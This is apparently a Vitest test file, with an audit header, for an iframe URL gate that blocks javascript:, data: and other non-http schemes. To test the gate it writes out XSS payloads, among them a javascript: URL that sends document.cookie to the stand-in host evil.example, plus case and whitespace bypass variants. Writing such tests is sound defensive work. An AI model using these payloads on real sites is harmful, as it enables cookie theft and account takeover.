/**
 * SECURITY AUDIT 2026-08-21 (V11) — only http(s) may reach an iframe src.
 *
 * ── WHAT WAS BROKEN ──
 *
 * toEmbedUrl() returned any URL it did not recognise UNCHANGED, and its
 * callers put the result straight into `<iframe :src>`. A `javascript:` URL
 * there executes in the EMBEDDING page's origin, because an iframe's
 * initial document is same-origin about:blank until it navigates; `data:`
 * text/html is the same trick in different clothes.
 *
 * The values that reach it are a lesson's content_ref and a product
 * media's embed_url — free text a Company Admin types, behind an
 * `<input type="url">` that is a client-side hint and nothing more, since
 * the API takes a direct POST. One render site is ProductShareView, a
 * public unauthenticated page.
 *
 * ── ALSO PINNED HERE, AND WHY IT MATTERS AS MUCH ──
 *
 * That ordinary URLs still pass through untouched. The tempting version of
 * this fix — allowlisting known video hosts — would silently blank every
 * Vimeo link, every Google Drive preview and every corporate LMS URL a
 * customer has already saved, and it would look like the feature broke
 * rather than like a security change. The rule is about the SCHEME, never
 * the host.
 */
import { describe, expect, it } from 'vitest'
import { toEmbedUrl } from '../embedUrl'

describe('toEmbedUrl — the iframe protocol gate', () => {
  it('refuses a javascript: URL', () => {
    expect(toEmbedUrl('javascript:fetch("https://evil.example/?c="+document.cookie)')).toBe('')
  })

  it('refuses a data: document', () => {
    expect(toEmbedUrl('data:text/html,<script>alert(1)</script>')).toBe('')
  })

  it('is not fooled by casing or leading whitespace', () => {
    // Both are how this gets past a naive `startsWith('javascript:')`.
    expect(toEmbedUrl('JaVaScRiPt:alert(1)')).toBe('')
    expect(toEmbedUrl('  javascript:alert(1)')).toBe('')
  })

  it('refuses other schemes rather than blocklisting the famous ones', () => {
    expect(toEmbedUrl('vbscript:msgbox(1)')).toBe('')
    expect(toEmbedUrl('file:///etc/passwd')).toBe('')
  })

  it('still rewrites a YouTube watch link into its embed form', () => {
    expect(toEmbedUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ')).toBe(
      'https://www.youtube.com/embed/dQw4w9WgXcQ',
    )
  })

  it('leaves an ordinary https URL from any host completely alone', () => {
    // The gate is about the scheme, never the host — see the header.
    expect(toEmbedUrl('https://player.vimeo.com/video/12345')).toBe('https://player.vimeo.com/video/12345')
    expect(toEmbedUrl('https://drive.google.com/file/d/abc/preview')).toBe(
      'https://drive.google.com/file/d/abc/preview',
    )
    expect(toEmbedUrl('https://lms.some-customer.co.th/course/1')).toBe('https://lms.some-customer.co.th/course/1')
  })

  it('allows plain http, which some internal hosts still are', () => {
    expect(toEmbedUrl('http://intranet.example/course')).toBe('http://intranet.example/course')
  })

  it('returns empty for null, undefined and empty input', () => {
    expect(toEmbedUrl(null)).toBe('')
    expect(toEmbedUrl(undefined)).toBe('')
    expect(toEmbedUrl('')).toBe('')
  })
})
